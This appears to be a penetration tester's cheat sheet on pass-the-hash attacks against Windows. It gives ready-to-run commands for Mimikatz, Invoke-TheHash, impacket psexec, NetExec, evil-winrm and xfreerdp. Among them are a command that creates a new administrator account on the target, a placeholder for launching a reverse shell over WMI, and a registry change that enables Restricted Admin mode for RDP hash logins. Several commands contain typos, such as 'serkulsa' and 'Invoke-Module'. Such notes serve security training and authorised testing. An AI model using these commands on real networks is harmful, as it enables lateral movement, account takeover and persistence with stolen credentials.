# Using a stolen hash for authentication 
## 1. Mimikatz 
`serkulsa::pth`
- this module allows us to perform a pth by starting a process using the hash of the user's password
	- `/user` - the username we want to impersonate 
	- `/rc4 or /ntlm` - The hash 
	- `/domain` 
	- `/run
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user: /domain: /rc4: /domain: " exit
```
## 2. Invoke-TheHash
https://github.com/Kevin-Robertson/Invoke-TheHash
Powershell scripts that pths with WMI and SMB 
- WMI and SMB connections are passed through the `.NET TCPClient`
- Authentication is done by passing an `NTLM` hash to `NTLMv2` protocol 
- User has to have admin privs 
WMI and SMB executions, options:
- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.
1. Import the module 
```powershell
Import-Module .\Invoke-TheHash.psd1
```
2. Run it 
```powershell 
Invoke-SMBExec -Target <ip> -Domain <domainname> -Usernmane <username> -Hash <hash> -Command "net user newUser userPass /add && net localgroup administrators mark /add" -Verbose
```
Get reverse shell but with WMI script, we use the machine name instead of ip address:
1. Invoke
```powershell
Invoke-Module .\Invoke-TheHash.psd1
```
2.Run it 
```powershell 
Invoke-WMIExec -Target DC01 -Domain domain -Username user -Hash hash -Command "powershell reverse shell" -Verbose
```

## 3. PsExec from impacket 
```bash 
psexec.py administrator@ip -hashes :hash 
```

## 4. Using NetExec
```bash 
netexec smb ip -u Administrator -d . -H hash 
```
- `--local-auth` - attempt to auth every host on a subnet
- `-x` - execute commands
## 5. Evil winrm 
```bash 
evil-winrm -i ip -u Administrator -H hash 
```

## 6. RDP 
- - `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error: 
- You add a new registry key. `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of `0`
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 
```
then authenticate using freerdp 
```bash 
xfreerdp3 /v:ip /u:Administrator /pth:Hash
```

## UAC limits Pass the Hash for local accounts
User Account Control limits user admin privs 
when the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to `0`, it means the local admin `RID-500, Administrator` is the only local account with privs, setting it to `1`  allows other local admin accounts as well 

>**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
